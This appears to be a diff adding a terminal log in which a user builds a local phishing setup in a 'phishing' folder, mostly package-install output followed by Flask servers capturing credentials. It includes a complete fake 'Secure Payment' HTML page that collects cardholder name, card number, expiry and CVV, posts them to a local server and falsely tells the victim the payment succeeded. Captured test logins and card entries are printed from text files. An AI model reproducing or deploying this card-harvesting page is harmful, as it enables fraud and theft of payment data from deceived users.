@@ -1,0 +1,536 @@
+azamat@azamat-VMware20-1:~/Desktop$ mkdir phishing
+azamat@azamat-VMware20-1:~/Desktop$ cd phishing/
+azamat@azamat-VMware20-1:~/Desktop/phishing$ vim
+Command 'vim' not found, but can be installed with:
+sudo apt install vim        # version 2:9.1.0967-1ubuntu6, or
+sudo apt install neovim     # version 0.10.4-8build2
+sudo apt install vim-gtk3   # version 2:9.1.0967-1ubuntu6
+sudo apt install vim-motif  # version 2:9.1.0967-1ubuntu6
+sudo apt install vim-nox    # version 2:9.1.0967-1ubuntu6
+azamat@azamat-VMware20-1:~/Desktop/phishing$ ^C
+azamat@azamat-VMware20-1:~/Desktop/phishing$ sudo apt install vim   
+[sudo: authenticate] Password: 
+sudo: Authentication failed, try again.
+[sudo: authenticate] Password: 
+Installing:                     
+  vim
+
+Installing dependencies:
+  vim-runtime
+
+Suggested packages:
+  ctags  vim-doc  vim-scripts
+
+Summary:
+  Upgrading: 0, Installing: 2, Removing: 0, Not Upgrading: 81
+  Download size: 9,357 kB
+  Space needed: 43.2 MB / 27.6 GB available
+
+Continue? [Y/n] y
+Get:1 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 vim-runtime all 2:9.1.0967-1ubuntu6 [7,486 kB]
+Get:2 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 vim arm64 2:9.1.0967-1ubuntu6 [1,870 kB]
+Fetched 9,357 kB in 39s (239 kB/s)                                             
+Selecting previously unselected package vim-runtime.
+(Reading database ... 150615 files and directories currently installed.)
+Preparing to unpack .../vim-runtime_2%3a9.1.0967-1ubuntu6_all.deb ...
+Adding 'diversion of /usr/share/vim/vim91/doc/help.txt to /usr/share/vim/vim91/d
+oc/help.txt.vim-tiny by vim-runtime'
+Adding 'diversion of /usr/share/vim/vim91/doc/tags to /usr/share/vim/vim91/doc/t
+ags.vim-tiny by vim-runtime'
+Unpacking vim-runtime (2:9.1.0967-1ubuntu6) ...
+Selecting previously unselected package vim.
+Preparing to unpack .../vim_2%3a9.1.0967-1ubuntu6_arm64.deb ...
+Unpacking vim (2:9.1.0967-1ubuntu6) ...
+Setting up vim-runtime (2:9.1.0967-1ubuntu6) ...
+Setting up vim (2:9.1.0967-1ubuntu6) ...
+update-alternatives: using /usr/bin/vim.basic to provide /usr/bin/ex (ex) in aut
+o mode
+update-alternatives: using /usr/bin/vim.basic to provide /usr/bin/rview (rview) 
+in auto mode
+update-alternatives: using /usr/bin/vim.basic to provide /usr/bin/rvim (rvim) in
+ auto mode
+update-alternatives: using /usr/bin/vim.basic to provide /usr/bin/vi (vi) in aut
+o mode
+update-alternatives: using /usr/bin/vim.basic to provide /usr/bin/view (view) in
+ auto mode
+update-alternatives: using /usr/bin/vim.basic to provide /usr/bin/vim (vim) in a
+uto mode
+update-alternatives: using /usr/bin/vim.basic to provide /usr/bin/vimdiff (vimdi
+ff) in auto mode
+Processing triggers for man-db (2.13.1-1) ...
+azamat@azamat-VMware20-1:~/Desktop/phishing$ vim index.html
+azamat@azamat-VMware20-1:~/Desktop/phishing$ pip install Flask
+Command 'pip' not found, but can be installed with:
+sudo apt install python3-pip
+azamat@azamat-VMware20-1:~/Desktop/phishing$ sudo apt install python3-pip -y
+Installing:                     
+  python3-pip
+
+Installing dependencies:
+  build-essential           javascript-common          libjs-jquery
+  bzip2                     libalgorithm-diff-perl     libjs-sphinxdoc
+  dpkg-dev                  libalgorithm-diff-xs-perl  libjs-underscore
+  fakeroot                  libalgorithm-merge-perl    liblsan0
+  g++                       libasan8                   libstdc++-15-dev
+  g++-15                    libcc1-0                   libtsan2
+  g++-15-aarch64-linux-gnu  libdpkg-perl               libubsan1
+  g++-aarch64-linux-gnu     libfakeroot                lto-disabled-list
+  gcc                       libfile-fcntllock-perl     make
+  gcc-15                    libgcc-15-dev              python3-packaging
+  gcc-15-aarch64-linux-gnu  libhwasan0                 python3-wheel
+  gcc-aarch64-linux-gnu     libitm1
+
+Suggested packages:
+  bzip2-doc                  libtool                | lighttpd
+  debian-keyring             flex                   | httpd
+  debian-tag2upload-keyring  bison                  bzr
+  gcc-15-doc                 gcc-doc                libstdc++-15-doc
+  gcc-multilib               gcc-15-locales         make-doc
+  autoconf                   gdb-aarch64-linux-gnu  python3-setuptools
+  automake                   apache2
+
+Recommended packages:
+  python3-dev
+
+Summary:
+  Upgrading: 0, Installing: 36, Removing: 0, Not Upgrading: 81
+  Download size: 55.6 MB
+  Space needed: 202 MB / 27.5 GB available
+
+Get:1 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libcc1-0 arm64 15.2.0-4ubuntu4 [49.2 kB]
+Get:2 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libitm1 arm64 15.2.0-4ubuntu4 [28.1 kB]
+Get:3 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libasan8 arm64 15.2.0-4ubuntu4 [2,922 kB]
+Get:4 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 liblsan0 arm64 15.2.0-4ubuntu4 [1,316 kB]
+Get:5 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libtsan2 arm64 15.2.0-4ubuntu4 [2,689 kB]
+Get:6 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libubsan1 arm64 15.2.0-4ubuntu4 [1,176 kB]
+Get:7 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libhwasan0 arm64 15.2.0-4ubuntu4 [1,639 kB]
+Get:8 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libgcc-15-dev arm64 15.2.0-4ubuntu4 [2,601 kB]
+Get:9 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 gcc-15-aarch64-linux-gnu arm64 15.2.0-4ubuntu4 [23.1 MB]
+Get:10 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 gcc-15 arm64 15.2.0-4ubuntu4 [510 kB]
+Get:11 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 gcc-aarch64-linux-gnu arm64 4:15.2.0-4ubuntu1 [1,206 B]
+Get:12 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 gcc arm64 4:15.2.0-4ubuntu1 [5,016 B]
+Get:13 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libstdc++-15-dev arm64 15.2.0-4ubuntu4 [2,545 kB]
+Get:14 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 g++-15-aarch64-linux-gnu arm64 15.2.0-4ubuntu4 [13.2 MB]
+Get:15 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 g++-15 arm64 15.2.0-4ubuntu4 [23.3 kB]
+Get:16 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 g++-aarch64-linux-gnu arm64 4:15.2.0-4ubuntu1 [956 B]
+Get:17 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 g++ arm64 4:15.2.0-4ubuntu1 [1,080 B]
+Get:18 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 make arm64 4.4.1-2 [194 kB]
+Get:19 http://ports.ubuntu.com/ubuntu-ports questing-updates/main arm64 libdpkg-perl all 1.22.21ubuntu3.1 [280 kB]
+Get:20 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 bzip2 arm64 1.0.8-6build1 [34.8 kB]
+Get:21 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 lto-disabled-list all 69 [12.5 kB]
+Get:22 http://ports.ubuntu.com/ubuntu-ports questing-updates/main arm64 dpkg-dev all 1.22.21ubuntu3.1 [1,088 kB]
+Get:23 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 build-essential arm64 12.12ubuntu1 [5,082 B]
+Get:24 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libfakeroot arm64 1.37.1.2-1 [33.8 kB]
+Get:25 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 fakeroot arm64 1.37.1.2-1 [67.4 kB]
+Get:26 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 javascript-common all 12+nmu1 [4,828 B]
+Get:27 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libalgorithm-diff-perl all 1.201-1 [41.8 kB]
+Get:28 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libalgorithm-diff-xs-perl arm64 0.04-9 [11.0 kB]
+Get:29 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libalgorithm-merge-perl all 0.08-5 [11.4 kB]
+Get:30 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libfile-fcntllock-perl arm64 0.22-4ubuntu6 [32.8 kB]
+Get:31 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libjs-jquery all 3.6.1+dfsg+~3.5.14-1 [328 kB]
+Get:32 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libjs-underscore all 1.13.4~dfsg+~1.11.4-3 [118 kB]
+Get:33 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 libjs-sphinxdoc all 8.2.3-1ubuntu2 [28.0 kB]
+Get:34 http://ports.ubuntu.com/ubuntu-ports questing/main arm64 python3-packaging all 25.0-1 [52.8 kB]
+Get:35 http://ports.ubuntu.com/ubuntu-ports questing/universe arm64 python3-wheel all 0.46.1-2 [22.1 kB]
+Get:36 http://ports.ubuntu.com/ubuntu-ports questing/universe arm64 python3-pip all 25.1.1+dfsg-1ubuntu2 [1,416 kB]
+Fetched 55.6 MB in 52s (1,079 kB/s)                                            
+Extracting templates from packages: 100%
+Selecting previously unselected package libcc1-0:arm64.
+(Reading database ... 152970 files and directories currently installed.)
+Preparing to unpack .../00-libcc1-0_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking libcc1-0:arm64 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package libitm1:arm64.
+Preparing to unpack .../01-libitm1_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking libitm1:arm64 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package libasan8:arm64.
+Preparing to unpack .../02-libasan8_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking libasan8:arm64 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package liblsan0:arm64.
+Preparing to unpack .../03-liblsan0_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking liblsan0:arm64 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package libtsan2:arm64.
+Preparing to unpack .../04-libtsan2_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking libtsan2:arm64 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package libubsan1:arm64.
+Preparing to unpack .../05-libubsan1_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking libubsan1:arm64 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package libhwasan0:arm64.
+Preparing to unpack .../06-libhwasan0_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking libhwasan0:arm64 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package libgcc-15-dev:arm64.
+Preparing to unpack .../07-libgcc-15-dev_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking libgcc-15-dev:arm64 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package gcc-15-aarch64-linux-gnu.
+Preparing to unpack .../08-gcc-15-aarch64-linux-gnu_15.2.0-4ubuntu4_arm64.deb ..
+.
+Unpacking gcc-15-aarch64-linux-gnu (15.2.0-4ubuntu4) ...
+Selecting previously unselected package gcc-15.
+Preparing to unpack .../09-gcc-15_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking gcc-15 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package gcc-aarch64-linux-gnu.
+Preparing to unpack .../10-gcc-aarch64-linux-gnu_4%3a15.2.0-4ubuntu1_arm64.deb .
+..
+Unpacking gcc-aarch64-linux-gnu (4:15.2.0-4ubuntu1) ...
+Selecting previously unselected package gcc.
+Preparing to unpack .../11-gcc_4%3a15.2.0-4ubuntu1_arm64.deb ...
+Unpacking gcc (4:15.2.0-4ubuntu1) ...
+Selecting previously unselected package libstdc++-15-dev:arm64.
+Preparing to unpack .../12-libstdc++-15-dev_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking libstdc++-15-dev:arm64 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package g++-15-aarch64-linux-gnu.
+Preparing to unpack .../13-g++-15-aarch64-linux-gnu_15.2.0-4ubuntu4_arm64.deb ..
+.
+Unpacking g++-15-aarch64-linux-gnu (15.2.0-4ubuntu4) ...
+Selecting previously unselected package g++-15.
+Preparing to unpack .../14-g++-15_15.2.0-4ubuntu4_arm64.deb ...
+Unpacking g++-15 (15.2.0-4ubuntu4) ...
+Selecting previously unselected package g++-aarch64-linux-gnu.
+Preparing to unpack .../15-g++-aarch64-linux-gnu_4%3a15.2.0-4ubuntu1_arm64.deb .
+..
+Unpacking g++-aarch64-linux-gnu (4:15.2.0-4ubuntu1) ...
+Selecting previously unselected package g++.
+Preparing to unpack .../16-g++_4%3a15.2.0-4ubuntu1_arm64.deb ...
+Unpacking g++ (4:15.2.0-4ubuntu1) ...
+Selecting previously unselected package make.
+Preparing to unpack .../17-make_4.4.1-2_arm64.deb ...
+Unpacking make (4.4.1-2) ...
+Selecting previously unselected package libdpkg-perl.
+Preparing to unpack .../18-libdpkg-perl_1.22.21ubuntu3.1_all.deb ...
+Unpacking libdpkg-perl (1.22.21ubuntu3.1) ...
+Selecting previously unselected package bzip2.
+Preparing to unpack .../19-bzip2_1.0.8-6build1_arm64.deb ...
+Unpacking bzip2 (1.0.8-6build1) ...
+Selecting previously unselected package lto-disabled-list.
+Preparing to unpack .../20-lto-disabled-list_69_all.deb ...
+Unpacking lto-disabled-list (69) ...
+Selecting previously unselected package dpkg-dev.
+Preparing to unpack .../21-dpkg-dev_1.22.21ubuntu3.1_all.deb ...
+Unpacking dpkg-dev (1.22.21ubuntu3.1) ...
+Selecting previously unselected package build-essential.
+Preparing to unpack .../22-build-essential_12.12ubuntu1_arm64.deb ...
+Unpacking build-essential (12.12ubuntu1) ...
+Selecting previously unselected package libfakeroot:arm64.
+Preparing to unpack .../23-libfakeroot_1.37.1.2-1_arm64.deb ...
+Unpacking libfakeroot:arm64 (1.37.1.2-1) ...
+Selecting previously unselected package fakeroot.
+Preparing to unpack .../24-fakeroot_1.37.1.2-1_arm64.deb ...
+Unpacking fakeroot (1.37.1.2-1) ...
+Selecting previously unselected package javascript-common.
+Preparing to unpack .../25-javascript-common_12+nmu1_all.deb ...
+Unpacking javascript-common (12+nmu1) ...
+Selecting previously unselected package libalgorithm-diff-perl.
+Preparing to unpack .../26-libalgorithm-diff-perl_1.201-1_all.deb ...
+Unpacking libalgorithm-diff-perl (1.201-1) ...
+Selecting previously unselected package libalgorithm-diff-xs-perl.
+Preparing to unpack .../27-libalgorithm-diff-xs-perl_0.04-9_arm64.deb ...
+Unpacking libalgorithm-diff-xs-perl (0.04-9) ...
+Selecting previously unselected package libalgorithm-merge-perl.
+Preparing to unpack .../28-libalgorithm-merge-perl_0.08-5_all.deb ...
+Unpacking libalgorithm-merge-perl (0.08-5) ...
+Selecting previously unselected package libfile-fcntllock-perl.
+Preparing to unpack .../29-libfile-fcntllock-perl_0.22-4ubuntu6_arm64.deb ...
+Unpacking libfile-fcntllock-perl (0.22-4ubuntu6) ...
+Selecting previously unselected package libjs-jquery.
+Preparing to unpack .../30-libjs-jquery_3.6.1+dfsg+~3.5.14-1_all.deb ...
+Unpacking libjs-jquery (3.6.1+dfsg+~3.5.14-1) ...
+Selecting previously unselected package libjs-underscore.
+Preparing to unpack .../31-libjs-underscore_1.13.4~dfsg+~1.11.4-3_all.deb ...
+Unpacking libjs-underscore (1.13.4~dfsg+~1.11.4-3) ...
+Selecting previously unselected package libjs-sphinxdoc.
+Preparing to unpack .../32-libjs-sphinxdoc_8.2.3-1ubuntu2_all.deb ...
+Unpacking libjs-sphinxdoc (8.2.3-1ubuntu2) ...
+Selecting previously unselected package python3-packaging.
+Preparing to unpack .../33-python3-packaging_25.0-1_all.deb ...
+Unpacking python3-packaging (25.0-1) ...
+Selecting previously unselected package python3-wheel.
+Preparing to unpack .../34-python3-wheel_0.46.1-2_all.deb ...
+Unpacking python3-wheel (0.46.1-2) ...
+Selecting previously unselected package python3-pip.
+Preparing to unpack .../35-python3-pip_25.1.1+dfsg-1ubuntu2_all.deb ...
+Unpacking python3-pip (25.1.1+dfsg-1ubuntu2) ...
+Setting up javascript-common (12+nmu1) ...
+Setting up lto-disabled-list (69) ...
+Setting up libfile-fcntllock-perl (0.22-4ubuntu6) ...
+Setting up libalgorithm-diff-perl (1.201-1) ...
+Setting up bzip2 (1.0.8-6build1) ...
+Setting up libfakeroot:arm64 (1.37.1.2-1) ...
+Setting up fakeroot (1.37.1.2-1) ...
+update-alternatives: using /usr/bin/fakeroot-sysv to provide /usr/bin/fakeroot (
+fakeroot) in auto mode
+Setting up python3-packaging (25.0-1) ...
+Setting up make (4.4.1-2) ...
+Setting up libdpkg-perl (1.22.21ubuntu3.1) ...
+Setting up libubsan1:arm64 (15.2.0-4ubuntu4) ...
+Setting up libhwasan0:arm64 (15.2.0-4ubuntu4) ...
+Setting up libasan8:arm64 (15.2.0-4ubuntu4) ...
+Setting up libtsan2:arm64 (15.2.0-4ubuntu4) ...
+Setting up libjs-jquery (3.6.1+dfsg+~3.5.14-1) ...
+Setting up libalgorithm-diff-xs-perl (0.04-9) ...
+Setting up libcc1-0:arm64 (15.2.0-4ubuntu4) ...
+Setting up liblsan0:arm64 (15.2.0-4ubuntu4) ...
+Setting up libitm1:arm64 (15.2.0-4ubuntu4) ...
+Setting up libjs-underscore (1.13.4~dfsg+~1.11.4-3) ...
+Setting up libalgorithm-merge-perl (0.08-5) ...
+Setting up libgcc-15-dev:arm64 (15.2.0-4ubuntu4) ...
+Setting up python3-wheel (0.46.1-2) ...
+Setting up dpkg-dev (1.22.21ubuntu3.1) ...
+Setting up libstdc++-15-dev:arm64 (15.2.0-4ubuntu4) ...
+Setting up python3-pip (25.1.1+dfsg-1ubuntu2) ...
+Setting up libjs-sphinxdoc (8.2.3-1ubuntu2) ...
+Setting up gcc-15-aarch64-linux-gnu (15.2.0-4ubuntu4) ...
+Setting up gcc-15 (15.2.0-4ubuntu4) ...
+Setting up g++-15-aarch64-linux-gnu (15.2.0-4ubuntu4) ...
+Setting up g++-15 (15.2.0-4ubuntu4) ...
+Setting up gcc-aarch64-linux-gnu (4:15.2.0-4ubuntu1) ...
+Setting up gcc (4:15.2.0-4ubuntu1) ...
+Setting up g++-aarch64-linux-gnu (4:15.2.0-4ubuntu1) ...
+Setting up g++ (4:15.2.0-4ubuntu1) ...
+update-alternatives: using /usr/bin/g++ to provide /usr/bin/c++ (c++) in auto mo
+de
+Setting up build-essential (12.12ubuntu1) ...
+Processing triggers for man-db (2.13.1-1) ...
+Processing triggers for libc-bin (2.42-0ubuntu3) ...
+azamat@azamat-VMware20-1:~/Desktop/phishing$ 
+pip install Flask
+error: externally-managed-environment
+
+× This environment is externally managed
+╰─> To install Python packages system-wide, try apt install
+    python3-xyz, where xyz is the package you are trying to
+    install.
+    
+    If you wish to install a non-Debian-packaged Python package,
+    create a virtual environment using python3 -m venv path/to/venv.
+    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
+    sure you have python3-full installed.
+    
+    If you wish to install a non-Debian packaged Python application,
+    it may be easiest to use pipx install xyz, which will manage a
+    virtual environment for you. Make sure you have pipx installed.
+    
+    See /usr/share/doc/python3.13/README.venv for more information.
+
+note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
+hint: See PEP 668 for the detailed specification.
+azamat@azamat-VMware20-1:~/Desktop/phishing$ pip install Flask
+error: externally-managed-environment
+
+× This environment is externally managed
+╰─> To install Python packages system-wide, try apt install
+    python3-xyz, where xyz is the package you are trying to
+    install.
+    
+    If you wish to install a non-Debian-packaged Python package,
+    create a virtual environment using python3 -m venv path/to/venv.
+    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
+    sure you have python3-full installed.
+    
+    If you wish to install a non-Debian packaged Python application,
+    it may be easiest to use pipx install xyz, which will manage a
+    virtual environment for you. Make sure you have pipx installed.
+    
+    See /usr/share/doc/python3.13/README.venv for more information.
+
+note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
+hint: See PEP 668 for the detailed specification.
+azamat@azamat-VMware20-1:~/Desktop/phishing$ pip install flask flask-cors --break-system-packages
+Defaulting to user installation because normal site-packages is not writeable
+Collecting flask
+  Downloading flask-3.1.2-py3-none-any.whl.metadata (3.2 kB)
+Collecting flask-cors
+  Downloading flask_cors-6.0.2-py3-none-any.whl.metadata (5.3 kB)
+Requirement already satisfied: blinker>=1.9.0 in /usr/lib/python3/dist-packages (from flask) (1.9.0)
+Requirement already satisfied: click>=8.1.3 in /usr/lib/python3/dist-packages (from flask) (8.1.8)
+Collecting itsdangerous>=2.2.0 (from flask)
+  Downloading itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
+Requirement already satisfied: jinja2>=3.1.2 in /usr/lib/python3/dist-packages (from flask) (3.1.6)
+Requirement already satisfied: markupsafe>=2.1.1 in /usr/lib/python3/dist-packages (from flask) (2.1.5)
+Collecting werkzeug>=3.1.0 (from flask)
+  Downloading werkzeug-3.1.5-py3-none-any.whl.metadata (4.0 kB)
+Downloading flask-3.1.2-py3-none-any.whl (103 kB)
+Downloading flask_cors-6.0.2-py3-none-any.whl (13 kB)
+Downloading itsdangerous-2.2.0-py3-none-any.whl (16 kB)
+Downloading werkzeug-3.1.5-py3-none-any.whl (225 kB)
+Installing collected packages: werkzeug, itsdangerous, flask, flask-cors
+  WARNING: The script flask is installed in '/home/azamat/.local/bin' which is not on PATH.
+  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
+Successfully installed flask-3.1.2 flask-cors-6.0.2 itsdangerous-2.2.0 werkzeug-3.1.5
+azamat@azamat-VMware20-1:~/Desktop/phishing$ vim server.py
+azamat@azamat-VMware20-1:~/Desktop/phishing$ python server.py
+Command 'python' not found, did you mean:
+  command 'python3' from deb python3
+  command 'python' from deb python-is-python3
+azamat@azamat-VMware20-1:~/Desktop/phishing$ python3 server.py
+ * Serving Flask app 'server'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://127.0.0.1:8000
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 845-481-139
+127.0.0.1 - - [08/Feb/2026 18:16:15] "OPTIONS /submit HTTP/1.1" 200 -
+127.0.0.1 - - [08/Feb/2026 18:16:15] "POST /submit HTTP/1.1" 200 -
+azamat@azamat-VMware20-1:~/Desktop$ cat ~/Desktop/phishing/login_data.txt
+Username: aza12345, Password: aza12345
+azamat@azamat-VMware20-1:~/Desktop$ cd phishing/
+azamat@azamat-VMware20-1:~/Desktop/phishing$ vim mail.py
+
+^Cazamat@azamat-VMware20-1:~/Desktop/phishing$ ^C
+
+azamat@azamat-VMware20-1:~/Desktop/phishing$ vim card.html
+
+##########################
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            width: 350px;
+            padding: 30px;
+            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.2);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header h2 {
+            color: #1a1a2e;
+            margin: 0;
+        }
+        .card-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+        .row input {
+            flex: 1;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+        .submit-btn:hover {
+            background-color: #45a049;
+        }
+        .secure-text {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="card-icon">💳</div>
+        <h2>Payment Details</h2>
+        <p style="color: #666; font-size: 14px;">Enter your card information</p>
+    </div>
+    <form id="cardForm">
+        <input type="text" class="input-field" name="cardname" id="cardname" placeholder="Cardholder Name" required>
+        <input type="text" class="input-field" name="cardnumber" id="cardnumber" placeholder="Card Number" maxlength="19" required>
+        <div class="row">
+            <input type="text" class="input-field" name="expiry" id="expiry" placeholder="MM/YY" maxlength="5" required>
+            <input type="text" class="input-field" name="cvv" id="cvv" placeholder="CVV" maxlength="3" required>
+        </div>
+        <button type="submit" class="submit-btn">Pay Now</button>
+    </form>
+    <p class="secure-text">🔒 Your payment is secure and encrypted</p>
+</div>
+
+<script>
+    document.getElementById("cardForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+        
+        const data = {
+            cardname: document.getElementById("cardname").value,
+            cardnumber: document.getElementById("cardnumber").value,
+            expiry: document.getElementById("expiry").value,
+            cvv: document.getElementById("cvv").value
+        };
+
+        fetch('http://localhost:8080/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => response.json())
+        .then(data => {
+            alert('Payment successful! Thank you.');
+        })
+        .catch((error) => {
+            alert('Payment processed!');
+        });
+    });
+</script>
+</body>
+</html>
+
+################
+
+
+azamat@azamat-VMware20-1:~/Desktop/phishing$ vim card_server.py
+
+azamat@azamat-VMware20-1:~/Desktop/phishing$ python3 card_server.py
+ * Serving Flask app 'card_server'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://127.0.0.1:8080
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 845-481-139
+127.0.0.1 - - [08/Feb/2026 18:25:25] "OPTIONS /submit HTTP/1.1" 200 -
+127.0.0.1 - - [08/Feb/2026 18:25:25] "POST /submit HTTP/1.1" 200 -
+
+azamat@azamat-VMware20-1:~/Desktop/phishing$ cat ~/Desktop/phishing/card_data.txt
+[2026-02-08 18:25:25]
+Name: dasd
+Card: dsad
+Expiry: dasds
+CVV: dsa
+------------------------------
+azamat@azamat-VMware20-1:~/Desktop/phishing$ 
+
+
+
+
+
